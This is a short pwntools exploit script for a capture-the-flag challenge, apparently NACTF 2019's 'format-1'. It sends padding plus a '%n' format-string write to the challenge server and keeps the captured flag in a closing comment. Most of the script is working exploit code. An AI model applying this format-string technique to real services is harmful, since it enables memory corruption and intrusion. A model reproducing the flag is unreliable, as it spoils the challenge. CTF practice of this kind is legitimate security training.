#!/usr/bin/python2
#-*-coding:utf-8-*-
from pwn import *
from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
context.log_level = 'debug'
# functions for quick script
s       = lambda data               :ctx.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data))
sl      = lambda data               :ctx.sendline(str(data))
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, ''))
uu64    = lambda data   :u64(data.ljust(8, ''))

ctx.binary = './format-1'
#ctx.remote_libc = './libc.so'
ctx.remote = ('shell.2019.nactf.com', 31560)
#ctx.debug_remote_libc = False # True for debugging remote libc, false for local.

payload = 'A' * 42

for i in range(24,25):
    rs('remote')
    ru('Type something>')
    sl(payload + '%{}$n'.format(i))
    # ru('You typed: ')
    get = r()
    print(i,get)
# rs('remote') # uncomment this for exploiting remote target

irt()

# nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}
